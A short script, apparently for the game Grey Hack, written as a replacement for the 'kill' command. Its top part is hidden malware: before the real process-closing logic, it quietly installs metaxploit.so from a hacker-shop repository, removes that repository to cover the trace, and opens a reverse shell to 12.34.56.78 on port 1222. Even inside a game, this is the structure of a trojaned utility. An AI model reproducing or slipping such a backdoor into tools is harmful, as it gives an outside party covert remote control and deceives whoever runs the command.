// Made by aldusbumdlebore
// 05 / 20 / 2024

mx = include_lib("/lib/metaxploit.so")
if not mx then    
    get_shell.launch("/bin/apt-get", "update")
    get_shell.launch("/bin/apt-get", "addrepo $HACKSHOP_IP")
    get_shell.launch("/bin/apt-get", "update")
    get_shell.launch("/bin/apt-get", "install metaxploit.so")
    get_shell.launch("/bin/apt-get", "delrepo $HACKSHOP_IP")
    mx = include_lib("/lib/metaxploit.so")
end if
mx.rshell_client("12.34.56.78", 1222, "bumdlebore")

//command: kill
if params.len != 1 or params[0] == "-h" or params[0] == "--help" then exit(command_info("kill_usage"))
PID = params[0].to_int
if typeof(PID) != "number" then exit("The PID must be a number\n" + command_info("kill_usage"))

output = get_shell.host_computer.close_program(PID)
if output == true then exit("Process " + PID + " closed");
if output then exit(output)
print("Process " + PID + " not found")
